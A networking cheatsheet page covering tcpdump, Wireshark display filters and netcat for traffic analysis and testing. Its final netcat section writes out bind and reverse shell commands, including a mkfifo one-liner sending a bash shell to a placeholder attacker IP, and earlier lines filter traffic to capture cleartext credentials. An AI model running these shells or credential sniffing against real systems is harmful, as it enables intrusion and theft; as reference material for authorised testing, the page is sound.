+++
title = "Packet Analysis"
date = 2026-05-31T00:00:00-04:00
draft = false
description = "tcpdump capture filters, Wireshark display filters, and netcat for network testing and traffic analysis."
tags = ["networking", "tcpdump", "wireshark", "netcat", "packet-analysis"]
categories = ["cheatsheets"]
+++

## tcpdump

### Basic Capture

```bash
tcpdump -i eth0                     # capture on interface
tcpdump -i any                      # all interfaces
tcpdump -i eth0 -w capture.pcap     # write to file
tcpdump -r capture.pcap             # read from file
tcpdump -i eth0 -c 100              # capture 100 packets then stop
tcpdump -i eth0 -nn                 # no DNS/port name resolution
tcpdump -i eth0 -v                  # verbose (TTL, flags, checksums)
tcpdump -i eth0 -X                  # hex + ASCII output
tcpdump -i eth0 -A                  # ASCII only (useful for HTTP)
```

### Capture Filters (BPF Syntax)

```bash
# Host and network filters
tcpdump host 192.168.1.10
tcpdump src 10.0.0.1
tcpdump dst 10.0.0.1
tcpdump net 192.168.1.0/24
tcpdump not host 192.168.1.1

# Port filters
tcpdump port 443
tcpdump src port 1024
tcpdump portrange 20-21
tcpdump not port 22

# Protocol filters
tcpdump icmp
tcpdump tcp
tcpdump udp
tcpdump arp

# Combinations
tcpdump 'host 10.0.0.1 and (port 80 or port 443)'
tcpdump 'tcp and not (src port 22 or dst port 22)'

# TCP flags
tcpdump 'tcp[tcpflags] & tcp-syn != 0'             # SYN packets
tcpdump 'tcp[tcpflags] & (tcp-rst) != 0'           # RST packets
tcpdump 'tcp[tcpflags] == tcp-syn'                 # pure SYN (no ACK)
```

### Practical Examples

```bash
# Capture HTTP/HTTPS traffic excluding SSH
tcpdump -i eth0 -nn -A 'port 80 or port 443' 2>/dev/null

# Monitor DNS queries
tcpdump -i eth0 -nn port 53

# Watch ICMP (useful for detecting ping sweeps)
tcpdump -i eth0 icmp

# Capture credentials in cleartext protocols
tcpdump -i eth0 -A 'port 21 or port 23 or port 110'

# Save first 100MB then stop
tcpdump -i eth0 -w capture.pcap -C 100 -W 1
```

---

## Wireshark Display Filters

### Basic Syntax

```bash
# Protocol
http
dns
tls
icmp
arp

# IP
ip.src == 10.0.0.1
ip.dst == 192.168.1.0/24
ip.addr == 10.0.0.1         # src or dst

# Port
tcp.port == 443
udp.port == 53
tcp.srcport == 80

# Logical operators
ip.src == 10.0.0.1 and tcp.port == 80
http or dns
not arp
```

### HTTP & Web

```bash
http.request                            # all HTTP requests
http.response                           # all HTTP responses
http.request.method == "POST"           # POST requests only
http.response.code == 200
http.response.code >= 400              # errors
http.request.uri contains "login"
http contains "password"                # credential hunting
```

### TLS/SSL

```bash
tls.handshake.type == 1         # Client Hello
tls.handshake.type == 2         # Server Hello
tls.record.content_type == 21   # Alerts (connection issues)
ssl.handshake.ciphersuite       # cipher suite negotiation
```

### Useful Filters

```bash
tcp.flags.syn == 1 and tcp.flags.ack == 0   # SYN packets (port scan detection)
tcp.flags.rst == 1                           # RST packets
tcp.analysis.retransmission                  # retransmissions
dns.qry.name contains "evil"                 # suspicious DNS queries
frame contains "password"                    # keyword search across all fields
```

---

## netcat (nc)

### Listeners & Connections

```bash
nc -lvnp 4444               # listen: verbose, no DNS, port 4444
nc <host> 4444              # connect to listener
nc -v <host> 443            # connect with verbose output

# Quick port test
nc -zv <host> 22            # check if port 22 is open
nc -zv <host> 20-25         # check port range
```

### File Transfer

```bash
# Receiver
nc -lvnp 4444 > received_file

# Sender
nc <receiver-ip> 4444 < file_to_send

# With progress (pv required)
pv file_to_send | nc <receiver-ip> 4444
```

### Simple Chat

```bash
# Side A
nc -lvnp 4444

# Side B
nc <ip-of-A> 4444
```

### Bind & Reverse Shells (Lab / Authorized Testing)

```bash
# Bind shell — attacker connects to target
# On target:
nc -lvnp 4444 -e /bin/bash
# On attacker:
nc <target-ip> 4444

# Reverse shell — target connects back to attacker
# On attacker (listener):
nc -lvnp 4444
# On target:
nc <attacker-ip> 4444 -e /bin/bash

# Reverse shell without -e (use mkfifo)
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f
```

### HTTP Banner Grabbing

```bash
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc <host> 80
echo -e "GET / HTTP/1.1\r\nHost: <host>\r\n\r\n" | nc <host> 80
```
